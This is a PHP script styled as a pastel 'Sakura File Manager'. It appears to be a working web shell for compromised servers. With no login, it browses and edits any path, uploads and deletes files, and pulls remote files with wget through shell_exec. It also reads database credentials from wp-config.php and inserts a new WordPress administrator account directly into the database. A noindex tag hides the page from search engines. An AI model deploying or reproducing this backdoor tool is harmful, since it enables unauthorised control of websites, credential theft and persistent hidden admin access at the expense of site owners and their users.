<?php
session_start();

// ----[ Initial Configuration ]----
$currentDir = realpath(isset($_GET['path']) ? $_GET['path'] : __DIR__);
if (!is_dir($currentDir)) {
    die("Directory not found.");
}

function deleteDir($dirPath) {
    if (!is_dir($dirPath)) return unlink($dirPath);
    foreach (scandir($dirPath) as $item) {
        if ($item === '.' || $item === '..') continue;
        deleteDir($dirPath . DIRECTORY_SEPARATOR . $item);
    }
    return rmdir($dirPath);
}

// ----[ Recursive Function to Copy Folders/Files ]----
function copyRecursive($source, $dest) {
    if (is_dir($source)) {
        @mkdir($dest, 0777, true);
        $files = scandir($source);
        foreach ($files as $file) {
            if ($file === "." || $file === "..") continue;
            copyRecursive($source . DIRECTORY_SEPARATOR . $file, $dest . DIRECTORY_SEPARATOR . $file);
        }
    } else {
        copy($source, $dest);
    }
}

// ----[ Recursive Function to Add to ZipArchive ]----
function addFolderToZip($dir, $zip, $exclusiveLength) {
    $handle = opendir($dir);
    while (false !== ($f = readdir($handle))) {
        if ($f != '.' && $f != '..') {
            $filePath = $dir . DIRECTORY_SEPARATOR . $f;
            $localPath = substr($filePath, $exclusiveLength);
            if (is_dir($filePath)) {
                $zip->addEmptyDir($localPath);
                addFolderToZip($filePath, $zip, $exclusiveLength);
            } else if (is_file($filePath)) {
                $zip->addFile($filePath, $localPath);
            }
        }
    }
    closedir($handle);
}

// ----[ Helper Function to Extract ZIP ]----
function extractZipFile($zipFile, $destinationDir) {
    if (is_file($zipFile) && pathinfo($zipFile, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === TRUE) {
            $zip->extractTo($destinationDir);
            $zip->close();
            return true;
        }
    }
    return false;
}

// ----[ Variable to hold copied names result ]----
$copiedNamesResult = "";

// ----[ Feature: Add New Folder ]----
if (isset($_POST['new_folder']) && !empty(trim($_POST['folder_name']))) {
    $newFolderPath = $currentDir . DIRECTORY_SEPARATOR . trim($_POST['folder_name']);
    if (!file_exists($newFolderPath)) {
        mkdir($newFolderPath, 0777, true);
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ----[ Feature: Add New File ]----
if (isset($_POST['new_file']) && !empty(trim($_POST['file_name']))) {
    $newFilePath = $currentDir . DIRECTORY_SEPARATOR . trim($_POST['file_name']);
    if (!file_exists($newFilePath)) {
        file_put_contents($newFilePath, ""); 
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ----[ Feature: Download via wget ]----
if (isset($_POST['wget_download']) && !empty(trim($_POST['wget_url']))) {
    $url = trim($_POST['wget_url']);
    $filename = basename(parse_url($url, PHP_URL_PATH));
    if (empty($filename)) {
        $filename = 'downloaded_file_' . time() . '.txt';
    }
    $savePath = $currentDir . DIRECTORY_SEPARATOR . $filename;
    
    $escapedUrl = escapeshellarg($url);
    $escapedPath = escapeshellarg($savePath);
    
    if (function_exists('shell_exec')) {
        shell_exec("wget -O {$escapedPath} {$escapedUrl} > /dev/null 2>&1 &");
    }
    
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ----[ Feature: Add WordPress Admin User ]----
$wpMessage = "";
if (isset($_POST['create_wp_admin'])) {
    $wpUser  = trim($_POST['wp_user']);
    $wpPass  = $_POST['wp_pass'];
    $wpEmail = trim($_POST['wp_email']);
    $targetWpDir = isset($_POST['wp_path']) && !empty($_POST['wp_path']) ? realpath($_POST['wp_path']) : $currentDir;

    $configFile = $targetWpDir . DIRECTORY_SEPARATOR . 'wp-config.php';

    if (!file_exists($configFile)) {
        $wpMessage = "❌ Error: This directory is not a WordPress installation (wp-config.php file not found).";
    } else {
        $configContent = file_get_contents($configFile);
        
        preg_match("/define\s*,\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]/i", $configContent, $mName);
        preg_match("/define\s*,\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]/i", $configContent, $mUser);
        preg_match("/define\s*,\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]/i", $configContent, $mPass);
        preg_match("/define\s*,\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]/i", $configContent, $mHost);
        preg_match("/\\\$table_prefix\s*=\s*['\"](.*?)['\"]/i", $configContent, $mPrefix);

        if (empty($mName)) {
            preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $configContent, $mName);
            preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $configContent, $mUser);
            preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $configContent, $mPass);
            preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $configContent, $mHost);
            preg_match("/\\\$table_prefix\s*=\s*['\"](.*?)['\"]/i", $configContent, $mPrefix);
        }

        $dbName   = $mName[1] ?? '';
        $dbUser   = $mUser[1] ?? '';
        $dbPass   = $mPass[1] ?? '';
        $dbHost   = $mHost[1] ?? 'localhost';
        $prefix   = $mPrefix[1] ?? 'wp_';

        if (empty($dbName) || empty($dbUser)) {
            $wpMessage = "❌ Error: Failed to read database credentials from wp-config.php.";
        } else {
            try {
                $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8mb4", $dbUser, $dbPass);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

                $checkStmt = $pdo->prepare("SELECT COUNT(*) FROM {$prefix}users WHERE user_login = ?");
                $checkStmt->execute([$wpUser]);
                if ($checkStmt->fetchColumn() > 0) {
                    $wpMessage = "❌ Error: WordPress username '{$wpUser}' is already registered!";
                } else {
                    $now = date('Y-m-d H:i:s');
                    $userSql = "INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status) 
                                VALUES (?, MD5(?), ?, ?, ?, 0)";
                    $userStmt = $pdo->prepare($userSql);
                    $userStmt->execute([$wpUser, $wpPass, $wpUser, $wpEmail, $now]);
                    $userId = $pdo->lastInsertId();

                    $meta1 = $pdo->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, '{$prefix}user_level', '10')");
                    $meta1->execute([$userId]);

                    $capabilities = serialize(['administrator' => true]);
                    $meta2 = $pdo->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, '{$prefix}capabilities', ?)");
                    $meta2->execute([$userId, $capabilities]);

                    $wpMessage = "✅ Success! WordPress Administrator account '{$wpUser}' has been added successfully.";
                }
            } catch (PDOException $e) {
                $wpMessage = "❌ Database Connection Failed: " . $e->getMessage();
            }
        }
    }
}

// ----[ Feature: Bulk Actions (Delete, Copy, Zip, Extract, & Copy Names) ]----
if (isset($_POST['bulk_action']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
    $action = $_POST['bulk_action'];
    $items = $_POST['selected_items'];

    if ($action === 'delete') {
        foreach ($items as $item) {
            $target = realpath($currentDir . DIRECTORY_SEPARATOR . $item);
            if ($target && (strpos($target, $currentDir) === 0)) {
                deleteDir($target);
            }
        }
        header("Location: ?path=" . urlencode($currentDir));
        exit;
    } elseif ($action === 'copy') {
        $destDir = isset($_POST['dest_path']) && !empty(trim($_POST['dest_path'])) 
                   ? realpath(trim($_POST['dest_path'])) 
                   : $currentDir;
        
        if ($destDir && is_dir($destDir)) {
            foreach ($items as $item) {
                $source = $currentDir . DIRECTORY_SEPARATOR . $item;
                $dest = $destDir . DIRECTORY_SEPARATOR . $item;
                if (file_exists($source) && $source !== $dest) {
                    copyRecursive($source, $dest);
                }
            }
        }
        header("Location: ?path=" . urlencode($currentDir));
        exit;
    } elseif ($action === 'zip') {
        $zipName = 'archive_' . date('Ymd_His') . '.zip';
        $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
        
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($items as $item) {
                $source = $currentDir . DIRECTORY_SEPARATOR . $item;
                if (file_exists($source)) {
                    if (is_dir($source)) {
                        $parentPath = dirname($source) . DIRECTORY_SEPARATOR;
                        $exclusiveLength = strlen($parentPath);
                        $zip->addEmptyDir($item);
                        addFolderToZip($source, $zip, $exclusiveLength);
                    } else if (is_file($source)) {
                        $zip->addFile($source, $item);
                    }
                }
            }
            $zip->close();
        }
        header("Location: ?path=" . urlencode($currentDir));
        exit;
    } elseif ($action === 'unzip_bulk') {
        foreach ($items as $item) {
            $zipFile = $currentDir . DIRECTORY_SEPARATOR . $item;
            extractZipFile($zipFile, $currentDir);
        }
        header("Location: ?path=" . urlencode($currentDir));
        exit;
    } elseif ($action === 'copy_names') {
        $copiedNamesResult = implode("\n", $items);
    }
}

// ----[ Feature: Single Unzip via URL GET ]----
if (isset($_GET['unzip'])) {
    $zipFile = $currentDir . DIRECTORY_SEPARATOR . $_GET['unzip'];
    extractZipFile($zipFile, $currentDir);
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ----[ Feature: Rename File/Folder ]----
if (isset($_POST['rename_item'], $_POST['old_name'], $_POST['new_name'])) {
    $oldName = trim($_POST['old_name']);
    $newName = trim($_POST['new_name']);
    
    if (!empty($oldName) && !empty($newName)) {
        $oldPath = $currentDir . DIRECTORY_SEPARATOR . $oldName;
        $newPath = $currentDir . DIRECTORY_SEPARATOR . $newName;
        
        if (file_exists($oldPath) && !file_exists($newPath)) {
            rename($oldPath, $newPath);
        }
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// Single Delete
if (isset($_GET['delete'])) {
    $target = realpath($currentDir . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($target && strpos($target, $currentDir) === 0) {
        deleteDir($target);
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $currentDir . DIRECTORY_SEPARATOR . $_GET['download'];
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// View/Edit
if (isset($_GET['view'])) {
    $file = $currentDir . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($file)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
            file_put_contents($file, $_POST['content']);
            echo "<p>File saved.</p>";
        }
        $content = htmlspecialchars(file_get_contents($file));
        echo "<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600&display=swap'>";
        echo "<style>body{font-family:'Quicksand',sans-serif;background:#fff0f5;padding:20px;color:#4a3b5c;} textarea{background:#fff;border:2px solid #ffb6c1;border-radius:10px;padding:10px;font-family:monospace;}</style>";
        echo "<h3>✨ Edit File: ".basename($file)." ✨</h3>";
        echo "<form method='post'><textarea name='content' rows='20' cols='100'>{$content}</textarea><br><br><button type='submit' style='background:#ff69b4;color:white;border:none;padding:10px 20px;border-radius:20px;font-weight:bold;cursor:pointer;'>Save File</button></form>";
        echo "<p style='margin-top:15px;'><a href='?path=".urlencode($currentDir)."' style='color:#ff1493;text-decoration:none;font-weight:bold;'>⬅️ Back</a></p>";
        exit;
    }
}

// Upload
if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
    $tmpName = $_FILES['upload']['tmp_name'];
    $name = basename($_FILES['upload']['name']);
    move_uploaded_file($tmpName, $currentDir . DIRECTORY_SEPARATOR . $name);
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

$items = scandir($currentDir);
$isWordpressDir = file_exists($currentDir . DIRECTORY_SEPARATOR . 'wp-config.php');
?>

<!DOCTYPE html>
<html>
<head>
    <!-- Tag to prevent indexing by search engines -->
    <meta name="robots" content="noindex, nofollow">
    
    <title>🌸 Sakura File Manager 🌸</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Quicksand', sans-serif; 
            padding: 25px; 
            background: linear-gradient(135deg, #fbcfe8 0%, #e0e7ff 50%, #fed7aa 100%);
            background-attachment: fixed;
            color: #4b3869; 
        }
        h2 { 
            color: #db2777; 
            text-shadow: 2px 2px 4px rgba(255, 182, 193, 0.6);
            border-left: 6px solid #ec4899;
            padding-left: 12px;
        }
        .path-box {
            background: rgba(255, 255, 255, 0.7);
            padding: 10px 15px;
            border-radius: 12px;
            display: inline-block;
            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
            font-weight: bold;
        }
        table { 
            border-collapse: separate; 
            border-spacing: 0; 
            width: 100%; 
            margin-top: 15px; 
            background: rgba(255, 255, 255, 0.85); 
            border-radius: 16px; 
            overflow: hidden; 
            box-shadow: 0 8px 20px rgba(236, 72, 153, 0.15); 
        }
        td, th { padding: 14px; text-align: left; }
        th { 
            background: #f472b6; 
            color: white; 
            font-weight: 700;
            text-transform: uppercase;
            font-size: 13px;
            letter-spacing: 1px;
        }
        tr:nth-child(even) { background: rgba(253, 242, 248, 0.6); }
        tr:hover { background: rgba(254, 205, 211, 0.4); }
        
        .actions-wrapper { 
            display: flex; 
            gap: 15px; 
            flex-wrap: wrap; 
            background: rgba(255, 255, 255, 0.8); 
            padding: 20px; 
            border-radius: 20px; 
            box-shadow: 0 8px 20px rgba(0,0,0,0.05);
            border: 2px dashed #f472b6;
        }
        .form-inline { display: flex; gap: 8px; align-items: center; }
        
        input[type="text"], input[type="file"], input[type="url"], input[type="password"], input[type="email"], select { 
            padding: 8px 12px; 
            border: 2px solid #fbcfe8; 
            border-radius: 10px; 
            outline: none;
            background: #fff;
            font-family: 'Quicksand', sans-serif;
            transition: 0.2s;
        }
        input:focus, select:focus { border-color: #ec4899; }

        button { 
            padding: 8px 16px; 
            cursor: pointer; 
            border: none; 
            border-radius: 12px; 
            background: #ec4899; 
            color: white; 
            font-weight: bold; 
            font-family: 'Quicksand', sans-serif;
            box-shadow: 0 4px 10px rgba(236, 72, 153, 0.3);
            transition: 0.2s; 
        }
        button:hover { background: #db2777; transform: translateY(-2px); }
        
        .bulk-actions { 
            margin-top: 20px; 
            background: rgba(254, 226, 226, 0.8); 
            padding: 15px 20px; 
            border-radius: 16px; 
            display: flex; 
            gap: 12px; 
            align-items: center; 
            flex-wrap: wrap; 
            border: 1px solid #fecaca;
        }
        .wp-panel { 
            margin-top: 20px; 
            background: rgba(220, 252, 231, 0.85); 
            padding: 20px; 
            border-radius: 16px; 
            border: 1px solid #bbf7d0; 
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.1);
        }
        .alert { 
            padding: 12px 15px; 
            background: rgba(254, 240, 138, 0.9); 
            border: 1px solid #fde047; 
            margin-bottom: 15px; 
            border-radius: 12px; 
            font-weight: bold;
            color: #854d0e;
        }
        .rename-form { display: none; margin-top: 8px; }
        .copy-names-box { 
            margin-top: 20px; 
            background: rgba(254, 243, 199, 0.9); 
            padding: 15px; 
            border: 2px dashed #f59e0b; 
            border-radius: 16px; 
        }
        a { color: #db2777; text-decoration: none; font-weight: bold; }
        a:hover { color: #9333ea; text-decoration: underline; }
        .back-link { font-size: 16px; margin-bottom: 15px; display: inline-block; }
    </style>
    <script>
        function toggleSelectAll(source) {
            checkboxes = document.getElementsByName('selected_items[]');
            for(var i=0, n=checkboxes.length; i<n; i++) {
                checkboxes[i].checked = source.checked;
            }
        }
        function showRenameForm(id) {
            var el = document.getElementById('rename_' + id);
            if (el.style.display === 'none') {
                el.style.display = 'block';
            } else {
                el.style.display = 'none';
            }
        }
        function copyTextToClipboard() {
            var copyText = document.getElementById("copiedNamesTextarea");
            copyText.select();
            copyText.setSelectionRange(0, 99999); 
            navigator.clipboard.writeText(copyText.value);
            alert("✨ Successfully copied file/folder names to clipboard! ✨");
        }
    </script>
</head>
<body>

<h2>🌸 Sakura File Manager 🌸</h2>
<div class="path-box">📂 Path: <?= htmlspecialchars($currentDir) ?></div>
<p><a href="?path=<?= urlencode(dirname($currentDir)) ?>" class="back-link">⬅️ Back to Parent Directory</a></p>

<?php if (!empty($wpMessage)): ?>
    <div class="alert"><?= htmlspecialchars($wpMessage) ?></div>
<?php endif; ?>

<!-- Copied Names Result Box -->
<?php if (!empty($copiedNamesResult)): ?>
    <div class="copy-names-box">
        <strong>📋 Copied File/Folder Names Result:</strong><br>
        <textarea id="copiedNamesTextarea" rows="5" style="width: 100%; margin-top: 8px; border-radius: 8px; border: 1px solid #f59e0b; padding: 8px;"><?= htmlspecialchars($copiedNamesResult) ?></textarea><br>
        <button type="button" onclick="copyTextToClipboard()" style="margin-top: 8px; background: #f59e0b;">✨ Copy to Clipboard (Auto)</button>
    </div>
<?php endif; ?>

<div class="actions-wrapper">
    <form method="post" enctype="multipart/form-data" class="form-inline">
        <input type="file" name="upload" required>
        <button type="submit">🚀 Upload File</button>
    </form>

    <form method="post" class="form-inline">
        <input type="text" name="folder_name" placeholder="New Folder Name" required>
        <button type="submit" name="new_folder">📁 Create Folder</button>
    </form>

    <form method="post" class="form-inline">
        <input type="text" name="file_name" placeholder="New File Name (ex: file.txt)" required>
        <button type="submit" name="new_file">📄 Create File</button>
    </form>

    <form method="post" class="form-inline">
        <input type="url" name="wget_url" placeholder="File URL (http://...)" required>
        <button type="submit" name="wget_download">📥 Wget Download</button>
    </form>
</div>

<!-- WordPress Add Admin Panel -->
<div class="wp-panel">
    <h3>⭐ WordPress Feature: Add New Administrator User ⭐</h3>
    <?php if ($isWordpressDir): ?>
        <p style="color: #15803d; font-weight: bold;">✔ This directory is a valid WordPress installation (wp-config.php found).</p>
        <form method="post" class="form-inline" style="flex-wrap: wrap; gap: 10px; margin-top: 10px;">
            <input type="hidden" name="wp_path" value="<?= htmlspecialchars($currentDir) ?>">
            <input type="text" name="wp_user" placeholder="New Username" required>
            <input type="password" name="wp_pass" placeholder="New Password" required>
            <input type="email" name="wp_email" placeholder="Admin Email" required>
            <button type="submit" name="create_wp_admin" style="background: #16a34a;">✨ Create WP Admin</button>
        </form>
    <?php else: ?>
        <p style="color: #b45309;">ℹ️ The current directory does not contain a <code>wp-config.php</code> file. Navigate to the WordPress root directory to use this feature.</p>
    <?php endif; ?>
</div>

<br>

<form method="post">
    <table>
        <tr>
            <th width="30"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
            <th>File / Folder Name</th>
            <th>Main Actions</th>
            <th>Rename</th>
        </tr>
        <?php 
        $index = 0;
        foreach ($items as $item):
            if ($item === '.' || $item === '..') continue;
            $path = $currentDir . DIRECTORY_SEPARATOR . $item;
            $isDir = is_dir($path);
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $index++;
            ?>
            <tr>
                <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($item) ?>"></td>
                <td><?= $isDir ? "🌸 📁" : "⭐ 📄" ?> <?= $isDir ? "<a href='?path=" . urlencode($path) . "'>$item</a>" : htmlspecialchars($item) ?></td>
                <td>
                    <?php if (!$isDir): ?>
                        <a href="?path=<?= urlencode($currentDir) ?>&download=<?= urlencode($item) ?>">Download</a> |
                        <a href="?path=<?= urlencode($currentDir) ?>&view=<?= urlencode($item) ?>">View/Edit</a> |
                        <?php if ($ext === 'zip'): ?>
                            <a href="?path=<?= urlencode($currentDir) ?>&unzip=<?= urlencode($item) ?>" onclick="return confirm('Extract this zip file to the current directory?')">Unzip</a> |
                        <?php endif; ?>
                    <?php endif; ?>
                    <a href="?path=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item) ?>" onclick="return confirm('Are you sure you want to delete this item?')" style="color: #e11d48;">Delete</a>
                </td>
                <td>
                    <button type="button" onclick="showRenameForm(<?= $index ?>)" style="background: #8b5cf6; padding: 5px 10px; font-size: 12px;">Rename</button>
                    <div id="rename_<?= $index ?>" class="rename-form">
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="old_name" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="new_name" value="<?= htmlspecialchars($item) ?>" required style="width: 130px; padding: 4px;">
                            <button type="submit" name="rename_item" style="background:#06b6d4; padding: 4px 8px; font-size: 12px;">Save</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>

    <!-- Bulk Actions Panel -->
    <div class="bulk-actions">
        <strong>✨ Selected Actions:</strong>
        <select name="bulk_action" id="bulk_action" required>
            <option value="">-- Choose Bulk Action --</option>
            <option value="delete">Delete Selected</option>
            <option value="copy">Copy Selected (Copy File/Folder)</option>
            <option value="copy_names">Copy Selected Names (Copy Names)</option>
            <option value="zip">Make Zip File (Compression)</option>
            <option value="unzip_bulk">Extract Selected ZIP (Unzip)</option>
        </select>
        <input type="text" name="dest_path" placeholder="Destination Directory (Copy only, Optional)" style="width: 260px;">
        <button type="submit" onclick="return confirm('Run bulk action on selected items?')" style="background: #db2777;">Process Bulk</button>
    </div>
</form>

</body>
</html>